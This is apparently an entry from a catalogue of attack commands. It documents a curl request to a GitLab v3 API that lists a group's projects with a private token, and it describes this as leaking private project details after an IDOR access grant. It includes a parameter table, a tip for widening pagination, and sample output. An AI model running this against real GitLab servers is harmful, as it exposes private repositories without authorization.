---
id: cmd-uuid-2
data: >-
  curl
  'http://gitlab-instance/api/v3/groups/7/projects.json?private_token=ZJirZUgh9QGSQfaGBHDL&search=&per_page=20'
tags:
  - api
  - gitlab
  - leak
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:28.186Z'
verified: false
validated: true
submitted: true
---
# gitlab-api-leak-group-projects

## Command

```bash
curl 'http://gitlab-instance/api/v3/groups/7/projects.json?private_token=ZJirZUgh9QGSQfaGBHDL&search=&per_page=20'
```

## Description

Retrieves a list of projects in a GitLab group via API, leaking private details after IDOR access grant.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `private_token` | User's API token | Yes |
| `search` | Query filter (empty for all) | No |
| `per_page` | Results limit (20) | No |

## Examples

### Basic Usage

```bash
curl 'http://gitlab-instance/api/v3/groups/7/projects.json?private_token=TOKEN'
```

### Advanced Usage

Add pagination: &page=1&per_page=100

## Expected Output

JSON array: [{'id':1,'name':'secret-project','description':'...','web_url':'...'}]

## Related

- [[commands/gitlab-share-project-with-group]]
